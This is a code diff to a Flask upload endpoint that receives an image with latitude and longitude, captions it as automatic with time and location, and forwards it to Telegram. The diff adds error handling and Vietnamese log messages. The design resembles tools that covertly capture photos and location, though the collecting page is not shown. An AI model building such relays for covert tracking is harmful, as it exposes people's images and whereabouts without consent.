@@ -189,8 +189,13 @@ def upload():
     lon = request.form.get('lon', 'unknown')
     timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
-    header, encoded = data_url.split(",", 1)
-    image_data = base64.b64decode(encoded)
+    try:
+        header, encoded = data_url.split(",", 1)
+        image_data = base64.b64decode(encoded)
+    except Exception as e:
+        print(f"LỖI PHÂN TÍCH DATA_URL: {e}")
+        return 'Lỗi phân tích dữ liệu ảnh'
+
 
     caption = f" Tự động: {timestamp}\n Vị trí: {lat}, {lon}"
 
@@ -201,9 +206,25 @@ def upload():
         'caption': caption
     }
 
-    response = requests.post(url, data=data, files=files)
-    return 'OK' if response.ok else 'Lỗi gửi ảnh'
+    try:
+        response = requests.post(url, data=data, files=files)
+        
+        # *** LOGGING CHI TIẾT LỖI TỪ TELEGRAM ***
+        if response.ok:
+            print("Gửi ảnh thành công đến Telegram.")
+            return 'OK'
+        else:
+            # In ra mã trạng thái và nội dung lỗi từ Telegram
+            print(f"LỖI GỬI ẢNH: Mã trạng thái: {response.status_code}")
+            print(f"LỖI GỬI ẢNH: Nội dung phản hồi: {response.text}")
+            return 'Lỗi gửi ảnh'
+            
+    except requests.exceptions.RequestException as e:
+        # Lỗi kết nối mạng (ví dụ: không kết nối được đến Telegram)
+        print(f"LỖI KẾT NỐI MẠNG: {e}")
+        return 'Lỗi kết nối mạng'
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port)
+
